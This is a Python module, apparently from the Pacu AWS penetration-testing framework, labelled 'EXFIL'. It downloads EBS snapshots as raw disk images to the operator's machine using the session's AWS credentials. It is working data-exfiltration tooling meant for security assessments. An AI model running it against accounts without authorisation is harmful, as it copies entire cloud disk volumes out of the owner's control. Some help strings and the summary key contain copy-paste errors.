#!/usr/bin/env python3
"""Module for ebs_snapshot_explorer"""
import argparse
import os
from functools import reduce
from typing import Iterator
from copy import deepcopy

import boto3
import dsnap
from dsnap.ebs import Ebs

from pacu import Main

module_info = {
    'name': 'ebs__download_snapshots',
    'author': 'Ryan Gerstenkorn ryan.gerstenkorn@rhinosecuritylabs.com',
    'category': 'EXFIL',
    'one_liner': 'Downloads EBS snapshots',
    'description': 'This module uses the EBS direct API to download specific snapshots to your computer. These can then be '
                   'mounted and explored using either docker or vagrant. For more information on how to mount these snapshots'
                   'see PLACEHOLDER.',
    'services': ['EC2'],
    'prerequisite_modules': ['ebs__enum_volumes_snapshots'],
    'arguments_to_autocomplete': ['--snapshot-id'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
parser.add_argument(
    '--snapshot-id',
    required=False,
    help='InstanceId of instance to target'
)

parser.add_argument(
    '--region',
    required=False,
    help='InstanceId of instance to target'
)


def pick_from_data(data: dict) -> (str, str):
    ebs = Ebs()
    ebs.set_snapshots(deepcopy(data).get("Snapshots", []))
    picked = ebs.snapshot_prompt()
    return picked['SnapshotId'], picked['Region']


def get_path(session_name: str, snapshot_id: str) -> str:
    volume_dir = f'./sessions/{session_name}/downloads/ebs/volumes/{snapshot_id}'
    os.makedirs(volume_dir, exist_ok=True)
    return os.path.join(volume_dir, "disk.img")


def main(args, pacu: Main):
    """Main module function, called from Pacu"""
    summary_data = {}
    print = pacu.print
    session = pacu.get_active_session()
    snapshot_id = parser.parse_args(args).snapshot_id
    region = parser.parse_args(args).region

    if not snapshot_id:
        if not pacu.fetch_data(['EC2'], 'ebs__enum_volumes_snapshots', []):
            print('Failed to fetch EBS snapshot data')
            return False
        snapshot_id, region = pick_from_data(pacu.get_active_session().EC2)

    snap = dsnap.snapshot.Snapshot(
        snapshot_id,
        pacu.get_boto_session(),
        pacu.get_botocore_conf(region=region)
    )

    path = get_path(session.name, snapshot_id)
    summary_data['snapshot_id'] = path
    snap.download(path)

    return summary_data


def summary(data, pacu):
    msg = ''
    for id in data:
        path = data[id]
        msg += f" Snapshot {id} written to {path}\n"
    return msg
